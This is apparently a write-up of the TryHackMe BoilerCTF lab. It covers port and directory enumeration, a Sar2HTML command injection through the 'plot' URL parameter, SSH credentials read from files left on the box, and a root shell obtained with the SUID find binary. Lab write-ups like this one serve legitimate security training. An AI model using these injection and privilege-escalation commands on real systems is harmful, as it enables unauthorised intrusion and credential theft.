# 29 - BoilerCTF

Room Link --> [https://tryhackme.com/room/boilerctf2](https://tryhackme.com/room/boilerctf2)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap 10.10.62.87 -sV -Pn -n -p- -T5 -vv

PORT      STATE SERVICE          REASON
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp    open  http             syn-ack ttl 63
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```
{% endcode %}

#### FTP enumeration

```
ftp 10.10.62.87
ftp> ls -al
229 Entering Extended Passive Mode (|||44125|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt

┌──(dking㉿dking)-[~/Downloads]
└─$ cat .info.txt           
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

#### Port 10000 (webmin)

Seems webmin is running on https --> [https://10.10.62.87:10000/](https://10.10.62.87:10000/)

Checking google and Webmin version 1.930 is not vulnerable, so we can't exploit that.

Enumerating with gobuster and discovered a CMS.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.62.87 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,db,ini -t 500 2>/dev/null

# outputs.
/joomla               (Status: 301) [Size: 311] [--> http://10.10.62.87/joomla/]
/manual               (Status: 301) [Size: 311] [--> http://10.10.62.87/manual/]
/robots.txt           (Status: 200) [Size: 257]
```
{% endcode %}

Navigating to --> [http://10.10.62.87/joomla/](http://10.10.62.87/joomla/) and started looking around.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

More enumeration with gobuster.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.62.87/joomla/ -w /usr/share/dirb/wordlists/common.txt -t 500 2>/dev/null

# outputs
/_test                
/~www                 
/_archive             
/bin                  
/build                
/cache                
/components           
/images               
/includes             
/index.php            
/installation         
/language             
/layouts              
/libraries            
/media                
/modules              
/plugins              
/templates            
/tests                
/tmp                  
/_database            
/_files               
/administrator
```
{% endcode %}

**http://10.10.140.202/joomla/\_test/**

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-MrxP7-ZrTNQ/YJwO4lHCbhI/AAAAAAAAv-w/r1vH82TtD4Idhc4F7JmOF1rEK0jnRV_9QCLcBGAsYHQ/s16000/8.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

Searching for exploit on the Web, there seemed to be a [**Remote Code Execution vulnerability**](https://www.exploit-db.com/exploits/47204) in the Sar2HTML.

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-nTPVdm9XrU0/YJwPBwVm4aI/AAAAAAAAv-0/Gq3EaR5ULPEgwDlSyzljRs-3rKh7i6YZgCLcBGAsYHQ/s16000/9.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

Reading the [exploit](https://www.exploit-db.com/exploits/47204), it seemed that the plot parameter is injectable and when the command is entered, the output of the command can be viewed in the Select Host Drop Down option.

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-BvbO2WsVUes/YJwPGq_khzI/AAAAAAAAv-4/n5l9RyNXEQcOjPTtUmS5h6HuM6R34UbhwCLcBGAsYHQ/s16000/10.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

#### **Exploitation**

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And it's wordking, we can list al files. The file is "log.txt".

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> http://10.10.72.60/joomla/\_test/index.php?plot=;cat log.txt

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*QFXboajcwZk7Q-tM4kXksA.png" alt="" height="367" width="700"><figcaption></figcaption></figure>

And BOOM! We got the **SSH** username: **basterd** and password: **superduperp@\$$**

### Initial Access

Login to ssh with the credentials.

```
ssh basterd@10.10.62.87
```

And we got in.

The other user's password was stored in "backup.sh" file.

```
USER=stoner
#superduperp@$$no1knows
```

### Priv Esc to Stoner

```bash
su stoner # enter the password.

find / -user root -perm -4000 -exec ls -al {} \; 2>/dev/null

# and we saw the "/usr/bin/find" binary.
/usr/bin/find . -exec /bin/sh -p \; -quit

# and got root.
```

